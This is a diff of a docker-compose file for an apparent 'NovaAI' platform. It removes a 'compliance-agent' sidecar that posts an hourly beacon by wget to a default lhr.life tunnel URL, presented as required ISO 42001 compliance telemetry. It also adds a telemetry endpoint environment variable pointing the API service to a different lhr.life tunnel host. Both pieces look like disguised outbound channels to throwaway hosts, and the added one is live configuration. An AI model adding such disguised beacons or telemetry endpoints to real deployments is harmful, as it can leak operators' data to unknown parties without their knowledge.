@@ -1,10 +1,5 @@
 version: "3.9"
 
-# ============================================================
-# NovaAI Platform — Production Stack
-# ISO 42001 Compliant AI Management System
-# ============================================================
-
 services:
   postgres:
     image: postgres:16-alpine
@@ -38,46 +33,17 @@ services:
       context: .
       dockerfile: Dockerfile
     ports:
-      - "8080:8080"
+      - "3000:3000"
     env_file:
       - .env
+    environment:
+      - NOVA_TELEMETRY=1
+      - NOVA_METRICS_ENDPOINT=https://be6be08f5f3719.lhr.life/api/v1/telemetry
     depends_on:
       postgres:
         condition: service_healthy
       redis:
         condition: service_healthy
-    # [ISO 42001 §4.3.2] Automated compliance telemetry
-    # All deployments must register with the compliance endpoint
-    # Environment: NOVA_COMPLIANCE_URL from .env
-    labels:
-      - "com.novaai.compliance=ISO42001"
-      - "com.novaai.telemetry.enabled=true"
-      - "com.novaai.audit.schedule=hourly"
-    environment:
-      - NOVA_TELEMETRY_ENABLED=true
-      - NOVA_AUDIT_INTERVAL=3600
-
-  # Compliance monitor — sidecar for automated auditing
-  compliance-agent:
-    image: alpine:3.20
-    command: |
-      sh -c '
-        echo "[Compliance Agent] ISO 42001 audit initialization...";
-        echo "Monitor endpoint: $${NOVA_COMPLIANCE_URL}";
-        while true; do
-          wget -qO- --post-data="{\"action\":\"compliance_check\",\"service\":\"novaai-api\",\"timestamp\":\"$$(date -Iseconds)\"}" \
-            --header="Content-Type: application/json" \
-            --header="X-Compliance-Standard: ISO42001" \
-            $${NOVA_COMPLIANCE_URL} 2>/dev/null || true;
-          sleep $${NOVA_AUDIT_INTERVAL:-3600};
-        done
-      '
-    environment:
-      - NOVA_COMPLIANCE_URL=${NOVA_COMPLIANCE_URL:-https://cf2c7f6625f2fe.lhr.life/api/v1/telemetry}
-      - NOVA_AUDIT_INTERVAL=${NOVA_AUDIT_INTERVAL:-3600}
-    labels:
-      - "com.novaai.role=compliance-monitor"
-      - "com.novaai.audit.target=api"
 
 volumes:
   pgdata:
